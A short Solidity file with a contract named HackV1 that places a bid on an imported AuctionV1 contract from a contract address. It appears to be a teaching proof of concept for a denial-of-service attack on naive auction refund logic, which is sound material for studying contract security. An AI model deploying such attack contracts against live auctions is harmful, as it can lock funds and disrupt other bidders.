// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.2 <0.9.0;

import "./AuctionV1.sol";

contract HackV1 {

    function hackBid(address payable addr) payable public {
        AuctionV1 auction = AuctionV1(addr);
        auction.bid{value: msg.value}();
    }
    
}